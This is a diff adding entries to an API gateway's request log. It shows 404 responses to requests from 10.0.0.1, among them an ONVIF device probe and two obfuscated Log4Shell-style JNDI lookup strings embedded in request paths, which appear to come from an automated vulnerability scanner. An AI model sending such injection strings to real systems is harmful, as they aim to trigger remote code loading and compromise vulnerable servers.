@@ -143,3 +143,13 @@
 [GATEWAY] 2025/11/03 - 16:30:37 | 404 |      74.667µs |        10.0.0.1 | GET     "/${jn${::-d}i${lower::}d${env:TEST:-n}s://10.0.0.1:41264/kVrwzOvUJdcgyfquCdAnrDPJlYsDSznX}"
 2025/11/03 16:30:47 CORS: Origin  not in allowed list
 [GATEWAY] 2025/11/03 - 16:30:47 | 404 |     145.041µs |        10.0.0.1 | POST    "/"
+2025/11/10 16:30:26 CORS: Origin  not in allowed list
+[GATEWAY] 2025/11/10 - 16:30:26 | 404 |    1.451208ms |        10.0.0.1 | POST    "/onvif/device_service"
+2025/11/10 16:30:37 CORS: Origin  not in allowed list
+[GATEWAY] 2025/11/10 - 16:30:37 | 404 |      67.833µs |        10.0.0.1 | GET     "/"
+2025/11/10 16:30:39 CORS: Origin  not in allowed list
+[GATEWAY] 2025/11/10 - 16:30:39 | 404 |      18.542µs |        10.0.0.1 | GET     "/${${env:TEST:-j}n${::-d}${::-i}:d${::-n}s://10.0.0.1:56039/xHVkvkEsTThQNbtGtXdSBGlYAbaYIHCs}"
+2025/11/10 16:30:49 CORS: Origin  not in allowed list
+[GATEWAY] 2025/11/10 - 16:30:49 | 404 |      12.917µs |        10.0.0.1 | POST    "/"
+2025/11/12 14:16:45 🛑 Shutting down API Gateway...
+2025/11/12 14:16:45 ✅ API Gateway exited cleanly
